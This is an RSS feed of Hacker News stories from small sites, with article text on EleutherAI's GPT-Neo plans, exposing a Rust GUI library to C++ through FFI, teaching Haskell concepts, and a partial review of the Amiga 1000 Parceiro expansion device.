<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 20 Jan 2021 13:12:04 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 20 Jan 2021 13:12:04 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[GPT-Neo recreating GPT-3 free open source]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 47 (<a href="https://news.ycombinator.com/item?id=25819803">thread link</a>) | @sieste
<br/>
January 18, 2021 | https://www.eleuther.ai/gpt-neo | <a href="https://web.archive.org/web/*/https://www.eleuther.ai/gpt-neo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main" dir="ltr"><section id="h.9ed95fdf8c1e1d9_74"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.7261759c41748bba_16"><div><div><p><img src="https://lh5.googleusercontent.com/3ncmWWJCFAFGql-vnUSRBNguBzpWU9pw4ZzrLwePHMJZ53rKERHpZITN0PZIIBnkoKIiPI11o6gTfCPACDmEllF5anQYhEf5EtPaYvJ16Dwi1Bh8d0WY3JEZIv8IXD4KZg=w1280" role="img"></p></div></div></div></div></div></div></div><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.9ed95fdf8c1e1d9_71"><div><div><p dir="ltr"><span>GPT-Neo is the code name for a series of transformer-based language models loosely styled around the GPT architecture that we plan to train and open source. Our primary goal is to replicate a GPT-3 sized model and open source it to the public, for free. </span></p><p dir="ltr"><span>Along the way we will be running experiments with </span><span><a href="https://www.google.com/url?q=https%3A%2F%2Farxiv.org%2Fabs%2F1701.06538&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHJmMleqfY7_hUomPrOnE0vc2d-VQ" target="_blank">alternative</a></span> <span><a href="https://www.google.com/url?q=https%3A%2F%2Farxiv.org%2Fabs%2F1911.03864&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFkViP0vtg72hlm50BfROBmFR67Ag" target="_blank">architectures</a></span><span> </span>and <span><a href="https://www.google.com/url?q=https%3A%2F%2Farxiv.org%2Fabs%2F2006.16236&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNECOymGhVzeI2sGyc6PufTta0RJlg" target="_blank">attention</a></span> <span><a href="https://www.google.com/url?q=https%3A%2F%2Fwww.aclweb.org%2Fanthology%2F2020.acl-main.672.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNE9TAomJh8x54cWNc_GMa-TnFV-Vg" target="_blank">types</a></span><span>, releasing any intermediate models, and writing up any findings on our blog. </span></p><p dir="ltr">We have a <span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherAI%2Fgpt-neo%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFoMdHQMTwRf6mrVBBHu1ZYPeY_3A" target="_blank">codebase</a></span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherAI%2Fgpt-neo%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFoMdHQMTwRf6mrVBBHu1ZYPeY_3A" target="_blank"> built in Tensorflow-mesh</a></span><span> (</span>for<span> training on TPU</span>s)<span>, and </span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherai%2Fgpt-neox&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFerlkNsmlncTy6qDAuYM9WyhVTtQ" target="_blank">one built </a></span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherai%2Fgpt-neox&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFerlkNsmlncTy6qDAuYM9WyhVTtQ" target="_blank">with Deepspeed</a></span> (for training on GPUs). Both can scale to GPT-3+ sizes, but we currently lack the TPUs to train a 175B model to completion. Thankfully, we don't lack GPUs.</p><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherAI%2Fgpt-neo%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFoMdHQMTwRf6mrVBBHu1ZYPeY_3A" target="_blank">GPT-Neo</a></span> is now fairly stable, and we will be releasing smaller scale models shortly. <span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherai%2Fgpt-neox&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFerlkNsmlncTy6qDAuYM9WyhVTtQ" target="_blank">GPT-Neox</a></span> is still a work in progress, and we will be releasing more updates as the project moves forward.</p></div></div></div></div></div></div></div></div></div></section><section id="h.9ed95fdf8c1e1d9_82"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.9ed95fdf8c1e1d9_79"><div><div><h3 id="h.i24o9xi2zff8" dir="ltr"><span><strong>Progress:</strong></span></h3><ul><li dir="ltr"><p dir="ltr">We<span> have the bulk of the model built, GPT-2 size models trained, and several experimental architectures implemented. </span></p></li><li dir="ltr"><p dir="ltr">Our current codebase should be able to scale up to GPT-3 sized models</p></li></ul></div></div></div></div></div></div></div><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.9ed95fdf8c1e1d9_83"><div><div><h3 id="h.e8y7b91fgfoz" dir="ltr"><span><strong>Next Steps:</strong></span></h3><ul><li dir="ltr"><p dir="ltr">We are currently working on wrapping up GPT-2-sized model replication, looking mostly at evaluations there.</p></li><li dir="ltr"><p dir="ltr">The largest model we've gotten to train for a single step so far has been 200B parameters.</p></li></ul></div></div></div></div></div></div></div></div></div></section></div></div>]]>
            </description>
            <link>https://www.eleuther.ai/gpt-neo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25819803</guid>
            <pubDate>Mon, 18 Jan 2021 09:13:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expose a Rust Library to Other Languages (Esp. C++)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25819763">thread link</a>) | @tronical
<br/>
January 18, 2021 | https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on January 13, 2021 by Olivier Goffart and Simon Hausmann</h5>
    
  <p>
    With <a href="https://sixtyfps.io/">SixtyFPS</a>, we are creating a GUI toolkit. We chose
    Rust as the implementation language for our runtime library, and we want to make the same library usable from different
    programming languages. We believe programmers in all languages need to build GUIs - powered by the same runtime library.
    Rust, with its Foreign Function Interface (FFI) is an excellent choice.<br> In
    this article we look at how to expose an idiomatic C++ API from our Rust library.
  </p>

<h3 id="the-challenge">The Challenge</h3>

    <p>Initially we chose to start with support for three languages:</p>
    <ul>
        <li><b>Rust</b>: Because it's our implementation language.</li>
        <li><b>C++</b>: It's a low level language that we're familiar with, and is still one of the most established languages
            in the embedded device space.</li>
        <li><b>JavaScript / TypeScript</b>: Because it's a very popular dynamic language.</li>
    </ul>


    <p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/diagrams.png"></p><p>The Rust library (also known as a crate) is split into two parts, the shared implementation crate and a thin idiomatic
        API crate.
    </p>
    <p>For JavaScript we use <a href="https://github.com/neon-bindings/neon">Neon</a> to expose an API. Neon enables us
        to conveniently write JavaScript APIs and create an NPM package.</p>
    <p>The C++ part is a bit more challenging.</p>

<h3 id="expose-idiomatic-cpp-api-through-ffi">Expose an Idiomatic C++ API through Rust FFI</h3>

    <p>We decided to keep the C++ API only in the header files. This is because, unlike with Rust, there's
        no widely adopted C++ equivalent of Cargo, to help with downloading and building dependencies. If we want to ship
        binaries, then we have to maintain ABI compatibility, which is difficult in C++.<br> This way, we can also keep the
        C++ binding as lightweight as possible: for performance and memory footprint.
    </p>
    
    <p>Rust cannot expose a C++ API: structures can only be exported using a C representation (<code>#[repr(C)]</code>) and
        <code>extern "C"</code> functions. This means that we cannot expose Rust features like traits, generics, or
        destructors even if they have a C++ equivalent.
     </p>
     
    <p>The Rust ecosystem provides a few helper crates to make the job easier:</p>
     <ul>
        <li><a href="https://github.com/eqrion/cbindgen"><b>cbindgen</b></a>: This helper crate automatically generates C/C++
            header files based on the <code>repr(C)</code> structure and the <code>extern "C"</code> functions. We use
            cbindgen to generate internal header files only. It's very helpful to avoid manually writing some unsafe error-prone
            boilerplate. 
        </li>
        <li><a href="https://github.com/mystor/rust-cpp">The <b>cpp</b> crate</a>: This
            helper crate is useful when calling C++ libraries from Rust, and we make use of that. However it is not suitable for
            exposing a C++ API from Rust. (Note: Olivier Goffart happens to be the maintainer.)
        </li>
                
        <li><a href="https://cxx.rs/">The <b>cxx</b> crate</a>: This would be a safer way than cbindgen to ensure that the
            interface between C++ and Rust is correct. While it could be useful, cbindgen already get us a long way. So
            we don't use it for now.
        </li>
    </ul>

<p>To build the correct shared library we use Cargo. The resulting library exports C mangled symbols. We ship
    a set of C++ header files that provide the C++ API and use the C functions behind the scenes. For convenience,
    we provide a CMake integration that ties together the library linkage and includes path setup. </p>

<h3 id="slices-vectors-strings">Slices, Vectors, and Strings</h3>

    <p>
    In FFI, passing a basic integer works out of the box. But what about more complex data types, like a 
    Rust slice or a string? Well, most classes like Rust's String, Vec, or slices are not <code>#[repr(C)]</code>,
    so we can't use them directly. While we could use these classes with an indirection, every simple call may need to go
    through a non-inline function boundary. So we would need to convert types, which means re-allocating memory.</p>
    <p>So instead of sharing code, we implemented data structures using <code>#[repr(C)]</code> and a stable ABI, so
        that they can be accessed directly from C++ and Rust, or any low-level language.</p>

   <p>For the slice we create a structure that holds a pointer and a size:</p>

<pre><code>#[repr(C)]
pub struct Slice&lt;'a, T&gt; {
    ptr: NonNull&lt;T&gt;,
    len: usize,
    phantom: PhantomData&lt;&amp;'a [T]&gt;,
}
</code></pre>

<p><code>Slice&lt;'a, T&gt;</code> can be dereferenced to <code>&amp;'a [T]</code>.
    In C++, cbindgen generates the following snippet:


</p><pre><code>template&lt;typename T&gt;
struct Slice {
    T *ptr;
    uintptr_t len;
};
</code></pre>

<p>We tell cbindgen to generate that code in a <code>cbindgen_private</code> namespace, and we wrap it an interface
similar to <code>std::span</code>.</p>

<p>We use strings and vectors to pass data between the engine and the user's code. This results in
    shared ownership where we want to avoid unnecessary copying of data. Our API is property based
    with setters and getters, therefore we implement shared ownership through
    <a href="https://en.wikipedia.org/wiki/Copy-on-write"></a>Implicit sharing / Copy-on-write. </p>

<p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/sharedvector.png"></p><pre><code>#[repr(C)]
struct SharedVectorHeader {
    refcount: atomic::AtomicIsize,
    size: usize,
    capacity: usize,
}

#[repr(C)]
pub struct SharedVector&lt;T&gt; {
    inner: NonNull&lt;SharedVectorInner&lt;T&gt;&gt;,
}


/// These functions are called from the C++ constructor
/// and destructor
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_allocate(
    size: usize, align: usize) -&gt; *mut u8 { /*...*/ }
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_free(
    ptr: *mut u8, size: usize, align: usize) { /*...*/ }
}
</code></pre>

<p>In Rust, the <code>impl Clone</code> and <code>impl Drop</code> make sure to increment
and decrement the atomic reference count and call the destructors. Similarly, in C++, we implement
copy constructor and destructor for the same purpose. Note that we still need to call the Rust
allocator function via the exposed C interface.</p>

<p>Now we can write a wrapper in C++:
(<a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/api/sixtyfps-cpp/include/sixtyfps_sharedvector.h">full file</a>)
</p>

<pre><code>template&lt;typename T&gt; struct SharedVector {
  SharedVector() : inner(nullptr) {}

  SharedVector(const SharedVector &amp;other)
    : inner(other.inner)
  { if (inner) ++inner-&gt;refcount; }

  ~SharedVector() {
     if (inner &amp;&amp; (--inner-&gt;refcount) == 0) {
        for (auto it = begin(); it &lt; end(); ++it)
            it-&gt;~T();
        cbindgen_private::sixtyfps_shared_vector_free(
            reinterpret_cast&lt;uint8_t *&gt;(inner),
            sizeof(SharedVectorHeader)
                + inner-&gt;capacity * sizeof(T),
            alignof(SharedVectorHeader));
     }
  }
  SharedVector &amp;operator=(const SharedVector &amp;other)
  { /*...*/ }

  const T *begin() const { /* ... */ }
  const T *end() const { /* ... */ }
  void push_back(const T &amp;value) { /* ... */ }
  // ... more vector-like API

private:
  // (SharedVectorHeader is generated by cbindgen)
  cbindgen_private::SharedVectorHeader *inner;
};
</code></pre>


    <p>Right now these types, such as <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a>, are within the internal <code>sixtyfps-corelib</code>
        crate, and re-exported for Rust users through the public <code>sixtyfps</code> crate.  If there is demand for it, we may consider moving them into a
        smaller public crate with its own release schedule.</p>


<h3 id="destructors">Destructors</h3>

    <p>It's important to note that <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a> have destructors in C++.
        We can't pass instances by value in <code>extern "C"</code> functions, because the calling conventions are different
        for arguments or return types with C++ destructors; not supported by C. Therefore we can only pass them by pointer
        or reference.
    </p>

    <p>If we want to add a C++ destructor, constructor, or any member functions to types directly exported by cbindgen to our public API, 
        we use 
        <code><a href="https://docs.rs/cbindgen/0.16.0/cbindgen/struct.ExportConfig.html">cbindgen::ExportConfig</a>::body</code>:</p>

<pre><code>cbindgen_config.export.body.insert(
    "MyStruct".to_owned(),
    "    inline MyStruct(); inline ~MyStruct();".to_owned()
  );
</code></pre>

    <p>
    Then we implement <code>MyStruct::MyStruct</code> and <code>MyStruct::~MyStruct</code> in a manually
    written header file, by either doing the memory management directly or calling C helper functions
    implemented in Rust.</p>
     <p>It's important to keep in mind that anything allocated from Rust needs to be freed by Rust. 
    The same applies to allocations in C++: they might not share the same allocator.
    </p>

<h3 id="dynamic-dispatch">Dynamic Dispatch (virtual table) Across the Language Barrier</h3>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Bon_toutou.png/186px-Bon_toutou.png"></p><p>
    Let's start with the classic example of dynamic dispatch in Rust:</p>
<pre><code>pub trait Animal {
  fn speak(&amp;self, loudness: i32) -&gt; String;
}
struct Dog { name: String }
impl Animal for Dog {
  fn speak(&amp;self, loudness: i32) -&gt; String
  { "Waf!".into() }
}
#[no_mangle]
pub extern "C" fn do_something_with(
  animal: &amp;dyn Animal
) {
  println!("{}", animal.speak(1));
}
</code></pre>

<p>Unfortunately the above code does not work. How could we implement a class <code>Cat</code>
in C++ and call the <code>do_something_with</code> function? What if we wanted to implement
<code>do_something_with</code> in C++? The problem is that trait objects (<code>&amp;dyn</code>) are not
valid in FFI - their binary representation is not guaranteed to be stable. If we try to compile the above code,
we get this warning:</p>

<pre><code>warning: `extern` fn uses type `dyn Animal`, which is not FFI-safe
  | extern "C" fn do_something_with(animal: &amp;dyn Animal)
  |                                         ^^^^^^^^^^^ not FFI-safe
  = note: `#[warn(improper_ctypes_definitions)]` on by default
  = note: trait objects have no C equivalent</code></pre>

  <!--https://doc.rust-lang.org/reference/types/trait-object.html-->
<p>Internally, <a href="https://brson.github.io/rust-anthology/1/all-about-trait-objects.html">we know</a> that
a trait object is composed of a pointer to the instance, and a pointer to a virtual table containing
pointers to functions. The layout of this trait object (which pointer comes first) and the layout of the virtual
table is an implementation detail of Rust. So we decided to re-implement them to work accross FFI. Instead of
writing a <code>trait Animal</code>, we write a virtual table by hand:</p>

<pre><code>#[repr(C)]
pub struct AnimalVTable {
    speak: extern "C" fn speak(
        VRef&lt;AnimalVTable&gt;, i32, &amp; mut SharedString);
}
</code></pre>
<p>In this case, our virtual table has only one function. It is <code>#[repr(C)]</code> so that
cbindgen can generate a structure that the C++ code can access. Since we can't use <code>String</code>
we changed the return type to <code>SharedString</code>. We also pass the parameter by mutable reference instead
of just returning it, because it is not allowed to return a type that has a destructor.<br>
Instead of passing a trait object, our functions receive a pointer to the virtual table and
a …</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</a></em></p>]]>
            </description>
            <link>https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25819763</guid>
            <pubDate>Mon, 18 Jan 2021 09:07:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching Haskell means teaching important concepts]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818697">thread link</a>) | @io_nathan
<br/>
January 17, 2021 | http://www.lambdabytes.io/posts/teachinghaskell/ | <a href="https://web.archive.org/web/*/http://www.lambdabytes.io/posts/teachinghaskell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="article">
        <p>I am teaching Haskell in the 1st semester Computer Science Master course <em>Concepts of higher programming languages</em> course. Why did I decide for Haskell and not Python, JavaScript (JS), TypeScript (TS), Scala, Erlang, Rust, <em>Your Favourite Programming Language</em>?</p>
<p>At this point I assume and expect that students are not only familiar with mainstream object-oriented programming (Java, C#) but that they more or less excel in it - they don’t have to be experts (nor can they, unless they have worked for many years in the industry), but they should be very confident and be able to write larger, complex applications in a proper OO way.</p>
<p>Getting into another OOish language like Python, JS, TS would be simply a waste of time. Therefore, I was contemplating teaching the central concepts of Haskell, Erlang and Rust. For Rust that would be its <em>borrowing</em> feature and how it achieves safe memory management, for Erlang that would be <em>Actors and shared-nothing-semantics message-passing</em>; and for Haskell… well it would be <em>Monads</em> but for the students to fully get it I realised that I would need to give a proper introduction into the whole language (following along the lines of Graham Huttons brilliant Book <em>Programming in Haskell (2nd ed.)</em> and extending it).</p>
<p>So I decided to go for “Haskell only” and it turned out to be the right decision, especially for a course on <em><strong>Concepts</strong></em> <em>of higher programming languages</em>. Haskell allows to discuss many concepts in the context of a pure functional language which makes it especially suitable for such a course. Of course, some concepts the students “know” from OO as they have found their way into mainstream by now but the way these concepts are presented and need to be dealt with in Haskell is in such a pure way that students will learn and get the most out of it. Sure, I could have also decided to teach the concepts in JS but they would come across as muddled and not very clear - and some of these concepts would simply not have been possible in JS (or would have been a crude and ugly workaround, with the deeper idea completely hidden underneath).</p>
<p>I am very well aware that very few (none) of the students will pick up Haskell later in their day-to-day life as software engineers, however it is my firm belief that the way this course taught them these concepts, will have made them much better developers, because they have a broader and deeper understanding of them. The main concepts I chose to teach are:</p>
<ul>
<li>
<p><strong>Static Types, immutable data, basic functions</strong>. Dealing with a really strong static type system (yes I know Java is also statically typed but as long as you have dynamic dispatch there is some runtime-type information around…), immutable data and pure functions is a challenge on its own, forcing the students to think very different about what they know so far.</p>
</li>
<li>
<p><strong>Explicit Recursion</strong>. No more mutable data, therefore we employ recursion instead of iteration and in-place memory updates. To think recursively takes a while but is probably among the most important abilities for computer scientists and it can never hurt to reiterate it.</p>
</li>
<li>
<p><strong>Higher-Order Functions</strong>. Probably the most essential concept to learn in this pure form in Haskell. The way it works in Haskell in combination with Currying and Lambdas is tremendously powerful, which is also realised by students. This concept has entered mainstream OO languages by now, therefore students are able to pick it up quickly and see why it is useful.</p>
</li>
<li>
<p><strong>Lambdas</strong>. Have arrived in mainstream OO as well and students quickly understand the use of anonymous functions to write concise code.</p>
</li>
<li>
<p><strong>Currying</strong>. Tremendously powerful concept, not available in this form in mainstream OO - yes you can hack a workaround which looks like currying but the way it comes across in Haskell is simply beautiful. When telling students that it can be understood as <em>Dependency Injection</em> the penny drops.</p>
</li>
<li>
<p><strong>Data Definitions</strong>. How can we define data types when there are no objects? ADTs is a very valuable lesson to learn, especially to teach recursive data types.</p>
</li>
<li>
<p><strong>Pattern Matching</strong>. Probably the most elegant feature of functional programming in general and invaluable to write concise recursive functions. It is still a mystery to me why Java has not properly implemented pattern matching yet.</p>
</li>
<li>
<p><strong>Lazy Evaluation</strong>. The concept of separating the producer from the consumer is extremely powerful and important on its own, left alone infinite data structures and functions on them. These concepts can be emulated to some extent in OO languages (for example with an <em>Iterator</em> or <em>Streams</em>), however it is nowhere as compelling and pure as in Haskell.</p>
</li>
<li>
<p><strong>Type Classes</strong>. To show students that polymorphism is <strong>not</strong> a unique feature of OO but that it is a fundamental concept allowing to express abstract concepts, facilitating code reuse (among others) and allows to express laws and concepts of a specific type. Students generally understand Type Classes as <em>a kind of interface</em> (in Java terms), which is fine for me and not far from the truth.</p>
</li>
<li>
<p><strong>Functors</strong>. Seeing how to apply already existing functions on types with some structure is a valuable insight. However I do not go too much into the “theory” and leave it at <em>a type with some structure which can be mapped over</em> - this generally blows the students mind anyway.</p>
</li>
<li>
<p><strong>Applicatives</strong>. Probably one of the hardest sells, I motivate it basically through <em>currying within a functor</em>. It is there, where students <em>should</em> get a glimpse what effectful programming means and how it can be achieved in a pure functional language.</p>
</li>
<li>
<p><strong>Foldable and Monoids</strong>. Getting more abstract, but folds and monoids have entered mainstream OO in functional stream processing, so students understand that it <strong>is</strong> useful. However the reductionist way that Haskell captures these concepts is perfect to explain it from first principles. Also I think every computer science student should know and understand what a <em>Monoid</em> is.</p>
</li>
<li>
<p><strong>Monads</strong>. I spend quite a lot of time building up to and motivating Monads as they capture everything learned so far and allow me then to talk about IO, Concurrency, STM and Property-Based Testing all of which build on Monads in some way. I am not using the do-notation straight away but am forcing them down the way along the »= operator to make it <strong>really</strong> explicit. The main point I make and I discuss at length here (and in IO) is <em>side effects</em>. When you come from a mainstream OO language, your idea about side effects is rather implicit and you have probably not thought about it in such an explicit way as you were forced to when dealing with it in Haskell. This is what I subject the students to and I think it is absolutely worth it: being more explicit about side effects in your thinking, reasoning and your code ultimately leads to better developers and better code.</p>
</li>
<li>
<p><strong>IO</strong> (and do-notation). After pestering the students with explicit »= I show them the do-notation and how to do “real-world” stuff with IO. At this point this is a huge relief for them as they have been wondering for some time now where the promised real-world applicability of Haskell is. The more important insight I discuss and students take away from this is that there are “impure uncontrollable” (IO) and “pure, controllable” (previous Monads) side effects - again this will broaden their horizon and allows them to think even more explicitly and detailed about side effects.</p>
</li>
<li>
<p><strong>Concurrency</strong>. Is generally a very poorly treated topic in CS studies. Students learn how easy it is to write concurrent programs in Haskell using <em>IORef</em>, <em>MVar</em> and <em>Async/Wait</em>.</p>
</li>
<li>
<p><strong>STM</strong>. To show students a very different approach to concurrency, making another showcase for the amazing type system of Haskell and how it deals with side effects.</p>
</li>
<li>
<p><strong>Property-Based Testing</strong>. To show students that there is more than tedious <em>Unit Tests</em> (they should be already familiar with). Expressing functional specifications directly in code blows their mind.</p>
</li>
<li>
<p><strong>Dependent Types</strong>. Going beyond Haskell and showing them whats next and what extremely powerful concepts are lurking in Dependent Types (I am using Idris): Types as 1st class Citizen, Totality, Programs as Proofs, Dependent Functions, Dependent Pairs, Equality as Type, Philosophical Foundations. So students have a rough idea what is possible but which will take decades to arrive in mainstream (if at all).</p>
</li>
</ul>
<p>What about the future of the course?
I can imagine that I am going to try out teaching Erlang in this course instead of Haskell and see how it goes down - or Rust - or Scala - or Clojure. Each of these languages has unique concepts and also allows to cover a few of the concepts I am teaching with Haskell. However, the problem is that to teach a language and its concepts you need to have a sufficiently deep understanding and also experience in each language. Unfortunately I can only say that about Haskell, Erlang and Java and I would need to fully and deeply learn other languages if I aim on teaching them. Unfortunately I doubt that I will have the time for that undertaking as it is substantial, therefore I will probably continue with Haskell as it is the language I am very familiar with and will stick with for the next years for real-world software engineering research. Still, just to get some fresh air into the course I think at one point I will try to go with Erlang or Elixir, which would also allow me to capture OO concepts from a functional perspective (how we can emulate subtyping with actors for example).</p>

    </article></div>]]>
            </description>
            <link>http://www.lambdabytes.io/posts/teachinghaskell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818697</guid>
            <pubDate>Mon, 18 Jan 2021 06:06:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Amiga 1000 Parceiro]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25818159">thread link</a>) | @jdkee
<br/>
January 17, 2021 | https://www.amigalove.com/viewtopic.php?t=1689 | <a href="https://web.archive.org/web/*/https://www.amigalove.com/viewtopic.php?t=1689">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><iframe width="560" height="315" src="https://www.youtube.com/embed/b0yBg6s99F0" frameborder="0" allowfullscreen=""></iframe></p>

<p><em>If you’d like to get an Amiga Parceiro for yourself, I explain how you can pre-order one at a heavily discounted rate at the end of the video and this article.</em></p><p>


A couple of years ago I made some videos where I showed my favorite Amiga 1000 setup at that time. It had two main hardware super powers that made it my daily driver. </p><p>

First, a fly-by of a glorious <a href="https://youtu.be/ZmW6LEwgruE">Rejuvenator board</a>, designed by the late Greg Tibbs out of Ohio (RIP Greg). A local good friend of mine here in Seattle named Christian Stich helped me upgrade that board to utilize a rare A3000 Agnus I found that can use 2MB of Chip RAM, which he custom built adapters for it to use. It also has a Kickstart 1.3 ROM chip to accelerate the boot up process and lose the typical Kickstart floppy. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6147&amp;sid=99a06cb58ec17764521616e0643319f1" alt="IMG_7827.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_7827.jpg (278.04 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6148&amp;sid=99a06cb58ec17764521616e0643319f1" alt="IMG_7842.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_7842.jpg (275.15 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p><em>Christian here is removing the old DRAMs, which were eight 256Kx4 in DIP format. He then installed four custom 1Mx4 in SOJ format  DRAMs with an adapter board that converts them to DIP format.</em></p><p>


The second thing was a hardware combo where I used a Microbotics Starboard expansion made back in 1987 that provided both extra fast RAM (in this case 1Mb), a real-time clock, and a SCSI module called the <a href="https://youtu.be/6BLXxY7FG5M">StarDrive which allowed me to use an Iomega SCSI Zip</a> as an external 100 MB hard drive. It used a custom Workbench boot disk that would pass control from the floppy over to the Zip drive and essentially turn the Zip into a semi-autobooting hard drive, which was a total game changer for that system. For all intents and purposes, that Amiga 1000 became one of my favorite, most treasured systems in my entire Amiga collection. </p><p>

<strong>A1000 equipped Starboard with SCSI Zip 100 as a hard drive </strong></p><p><iframe width="560" height="315" src="https://www.youtube.com/embed/6BLXxY7FG5M" frameborder="0" allowfullscreen=""></iframe></p>

<p>
Fast-forward to today, as I made the difficult decision to <em>remove</em> the Starboard and Zip drive and replace it with a brand new device called the <strong>Amiga Parceiro</strong>. (Parceiro in Portuguese means “partner”.) So it’s the Friend Partner. <img src="https://www.amigalove.com/images/smilies/icon_e_wink.gif" width="15" height="17" alt=";)" title="Wink"></p><p>

The Amiga Parceiro was invented over the course of the past year by an Amiga hobbyist named David Dunklee who resides in a small town outside of Colorado Springs, CO. </p><p>

As Dunklee puts it:</p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6149&amp;sid=99a06cb58ec17764521616e0643319f1" alt="DDunklee.png" onclick="viewableArea(this);"></dt>
						<!-- <dd>DDunklee.png (152.05 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
Fun Trivia: Mr Dunklee, now retired, was the CIO of the <a href="https://www.spaceforce.mil/">United States Space Force</a>, as well as an Air Force base commander. You heard that right, Number One. </p><p>


So let’s take a look at Mr. Dunklee’s new device for the Amiga 1000 and see what it can do. </p><p>

At a high level, the Parceiro can do everything my Starboard &amp; Zip combo could do except in a very tidy, modern package. And it can do it all faster and better. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6150&amp;sid=99a06cb58ec17764521616e0643319f1" alt="IMG_1027.JPG" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_1027.JPG (356.15 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
The Parceiro (sounds like par-say-ro) attaches to the side expansion port of the Amiga and is about the size of a harmonica that’s been run over by a steam roller as it’s only about 1/3 of an inch thick.</p><p>

It provides the following features: </p><ol><li> 8MB of Autoconfig Fast RAM. It is a single 8MB of SRAM versus DRAM, so it really and truly is indeed fast with zero wait states.</li> 
<li> Coin-cell battery backed Real Time Clock (RTC), which comes with its own clock software that gets put into your startup sequence.</li>
